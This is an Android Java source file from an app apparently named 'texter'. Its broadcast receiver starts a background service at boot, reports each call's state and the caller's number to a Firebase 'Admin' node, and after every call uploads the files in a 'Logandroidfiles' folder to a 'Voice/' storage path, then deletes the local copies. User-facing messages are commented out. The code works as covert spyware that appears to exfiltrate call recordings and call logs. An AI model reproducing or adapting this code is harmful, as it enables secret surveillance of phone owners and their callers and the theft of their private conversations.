package com.app.texter;

import static android.content.ContentValues.TAG;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.UUID;
import java.util.concurrent.ExecutionException;

public class broadcastRun extends BroadcastReceiver {



    FirebaseStorage storage;
    StorageReference storageReference;
    File filePath;
    File path;


    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference,databaseReferenceAdmin;




    @RequiresApi(api = Build.VERSION_CODES.R)
    @Override

    public void onReceive(Context context, Intent intent) {


        Intent serviceIntent =new Intent(context,serviceFail.class);

        String number= intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())){
            if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.O){
                 ContextCompat.startForegroundService(context,serviceIntent);
            }
            else{context.startService(serviceIntent);}
        }
        else if (number!=null) {

            firebaseDatabase = FirebaseDatabase.getInstance();
            databaseReferenceAdmin = firebaseDatabase.getReference("Admin");


            path = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/Logandroidfiles");
            if (!path.exists()){path.mkdirs();}



            String PhoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

            if (PhoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                CallStateUpdate("Ringing", number);
            }
            if ((PhoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))) {
                CallStateUpdate("talking", number);
            }
            if (PhoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                CallStateUpdate("idle", "last:" + number);



                try {
                    ArrayList<String> filesinDict = dictFiles(path);
                    if (isInternet(context)) {

                        //Toast.makeText(context, "Internet Connected", Toast.LENGTH_SHORT).show();
                        uploadFile(context, filesinDict, path);
                    }
                } catch (NullPointerException er) {
                    er.printStackTrace();
                } catch (Exception exc) {
                    exc.printStackTrace();
                }
            }


        }


    }






    public boolean isInternet(Context context){
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo nf = cm.getActiveNetworkInfo();
            return (nf != null && nf.isConnected());
        }
        catch (NullPointerException e){
            e.printStackTrace();
            return false;
        }


    }

    public ArrayList<String> dictFiles(File path){
        ArrayList<String> filesname=new ArrayList<>();

        File directory = new File(String.valueOf(path));
        File[] files = directory.listFiles();
        for (int i = 0; i < files.length; i++)
        {
            filesname.add(files[i].getName());
            Log.d("Files", "This is FileName:" + files[i].getName());
        }

        return filesname;
    }

    public void uploadFile(Context context, ArrayList<String> uploadfile,File path){
        storage = FirebaseStorage.getInstance();
        storageReference = storage.getReference();


        for (int i=0; i<uploadfile.size(); i++) {


            String filename=uploadfile.get(i);
            filePath=new File( path+"/"+filename);

            StorageReference ref = storageReference.child("Voice/").child(filename);

            ref.putFile(Uri.fromFile(filePath))


                    .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {

                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    Log.d(TAG, filePath.toString());
                    //Toast.makeText(context, "Uploaded!!", Toast.LENGTH_SHORT).show();
                    File file = new File(path, filename);
                    file.delete();
                }
            })

                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            //When error is thrown!
                            e.printStackTrace();
                            //Toast.makeText(context, "Failed " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    });
        }


    }

    private void setdata(Context context){
        databaseReferenceAdmin.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {


                OrderHelper DATA=new OrderHelper("0","1");
                databaseReference.setValue(DATA);
                //Toast.makeText(context, "Upload Done", Toast.LENGTH_SHORT).show();
            }


            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                //Toast.makeText(context, "Failed to update", Toast.LENGTH_SHORT).show();

            }
        });

    }

    public void CallStateUpdate(String state,String number) {
        HashMap h = new HashMap();
        h.put("call_state", state+"("+number+")");
        databaseReferenceAdmin.updateChildren(h).addOnSuccessListener(new OnSuccessListener() {
            @Override
            public void onSuccess(Object o) {

            }
        });

    }



}

